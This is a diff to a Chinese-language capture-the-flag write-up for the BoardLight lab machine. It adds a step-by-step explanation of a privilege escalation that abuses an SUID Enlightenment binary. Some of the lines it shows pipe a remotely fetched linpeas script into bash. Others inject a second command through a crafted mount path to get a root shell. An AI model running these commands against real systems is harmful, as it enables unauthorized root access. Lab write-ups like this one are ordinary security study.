@@ -136,6 +136,7 @@ larissa@boardlight:~$ cat user.txt
 [★]$ python3 -m http.server 3000
 Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ...
 ```
+#### SUID - Check easy privesc, exploits and write perms
 ```
 larissa@boardlight:~$ curl http://10.10.14.149:3000/linpeas.sh|bash
 
@@ -149,7 +150,6 @@ SUID - Check easy privesc, exploits and write perms
 -rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
 <SNIP>
 ```
-![距离那天第三天](images/091308.png)
 #### 在列出的文件中，启蒙运动突出显示它具有设置用户ID （SUID）位集，允许它以文件所有者（在本例中为root）的特权运行。它是一个轻量级的和视觉上吸引人的桌面环境，为Linux提供图形用户界面系统。
 #### 想到sudo -l
 ```
@@ -203,6 +203,15 @@ echo "/bin/sh" > /tmp/exploit
 chmod a+x /tmp/exploit
 echo "[+] Enjoy the root shell :)"
 ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+```
+#### /dev/../tmp/ 会被解析为 /tmp/，然后尝试在 /tmp 下创建恶意脚本
+#### 尝试利用漏洞执行恶意文件：${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+```
+1.利用找到的易受攻击的 SUID 文件 ${file}（即 enlightenment_sys），执行 mount 命令，挂载文件系统。
+2.-o noexec,nosuid,utf8,nodev,iocharset=utf8 等参数指定了挂载选项，其中 noexec 和 nosuid 会限制文件系统上的文件执行和 SUID 权限，但攻击者利用的技巧是绕过这些限制。
+3.uid=$(id -u) 通过 id -u 获取当前用户的 UID（通常是普通用户的 UID），然后将其传递给 mount 命令，用来设置挂载时的 UID。
+4.通过 "/dev/../tmp/;/tmp/exploit" 路径，绕过了某些路径验证，指向了 /tmp/exploit 文件。
+5.将 /tmp/exploit 作为要挂载的目标文件，并在 /tmp/net 目录中执行。
 ```
 #### 上传到ssh
 ```
